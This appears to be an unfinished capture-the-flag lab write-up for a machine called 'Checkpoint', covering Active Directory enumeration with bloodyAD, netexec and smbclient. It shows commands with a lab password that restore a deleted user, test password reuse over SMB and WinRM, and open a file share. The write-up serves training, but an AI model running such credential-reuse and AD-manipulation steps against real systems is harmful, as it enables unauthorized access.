
# CHECKPOINT

---
## Enumeration



---
#### NMAP





---
#### BLOODHOUND-CE-PYTHON

- had trouble using bloodhound
- we need `-k` and `--auth-method kerberos`




---
#### BLOODYAD

```
bloodyad --host 10.129.29.251 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```


<img width="844" height="355" alt="image" src="https://github.com/user-attachments/assets/481d2032-d028-40e8-89c2-f7588a31d6e9" />

```
bloodyad --host 10.129.29.251 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore mark.davies
```

<img width="809" height="66" alt="image" src="https://github.com/user-attachments/assets/6b712495-9ae2-4f2f-bca4-14fc57b4de74" />


//check passwd reuse

```
netexec smb 10.129.29.251 -u mark.davies -p 'Checkpoint2024!'
```
```
netexec winrm 10.129.29.251 -u mark.davies -p 'Checkpoint2024!'
```

<img width="1047" height="166" alt="image" src="https://github.com/user-attachments/assets/5ab27bf4-0651-4b0a-9cd7-277f20f6527c" />

```
netexec winrm 10.129.29.251 -u mark.davies -p 'Checkpoint2024!' --shares
```

<img width="1041" height="256" alt="image" src="https://github.com/user-attachments/assets/475dd2df-773f-4db9-a83b-e9dfb548a85a" />

```
smbclient //10.129.29.251/DevDrop -U'mark.davies%Checkpoint2024!'

```
<img width="551" height="361" alt="image" src="https://github.com/user-attachments/assets/6593ffbd-500d-4ea5-944f-1caf3693d677" />


//TBC











